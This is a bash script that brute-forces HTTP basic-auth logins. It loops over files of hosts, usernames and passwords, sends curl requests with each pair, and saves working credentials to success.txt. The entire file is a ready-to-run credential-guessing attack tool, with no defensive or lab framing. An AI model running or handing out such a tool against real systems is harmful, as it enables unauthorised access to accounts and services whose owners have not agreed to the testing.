#!/bin/bash

# Check if the required arguments are provided
if [ $# -ne 4 ]; then
    echo "Usage: $0 <host_list_file> <userlist_file> <passlist_file> <port>"
    exit 1
fi

# Define the files for the hosts, usernames, and passwords
HOSTS_FILE=$1
USERLIST_FILE=$2
PASSLIST_FILE=$3
PORT=$4

# Output file for successful credentials
SUCCESS_FILE="success.txt"

# Timeout for the curl command (in seconds)
TIMEOUT=5

# Loop through each host in the host list
while IFS= read -r HOST; do
    # Check if host is empty or a comment
    if [[ -z "$HOST" || "$HOST" =~ ^# ]]; then
        continue
    fi

    echo "Brute-forcing host: $HOST on port $PORT"

    # Loop through each password in the password list
    while IFS= read -r PASS; do
        echo "Trying password: $PASS on $HOST:$PORT"

        # Loop through each username in the user list (for the current password)
        while IFS= read -r USER; do
            echo "Trying username: $USER with password: $PASS on $HOST:$PORT"

            # Make the request with basic authentication and a timeout
            RESPONSE=$(curl -s -m $TIMEOUT -o /dev/null -w "%{http_code}" --user "$USER:$PASS" "http://$HOST:$PORT")

            # If HTTP code is 200, successful login
            if [ "$RESPONSE" -eq 200 ]; then
                echo "[SUCCESS] Found valid credentials for $HOST:$PORT - $USER:$PASS"
                
                # Output successful login to success.txt
                echo "$HOST:$PORT - $USER:$PASS" >> "$SUCCESS_FILE"
                break 2  # Break out of both loops (successful login)
            fi
        done < "$USERLIST_FILE"

        # After trying all usernames for the current password, move to the next password
        if [ "$RESPONSE" -eq 200 ]; then
            break  # Break out of the password loop (successful login)
        fi
    done < "$PASSLIST_FILE"

    echo "Finished brute-forcing $HOST:$PORT"
done < "$HOSTS_FILE"

echo "Brute-force attack complete. Successful credentials saved to $SUCCESS_FILE."
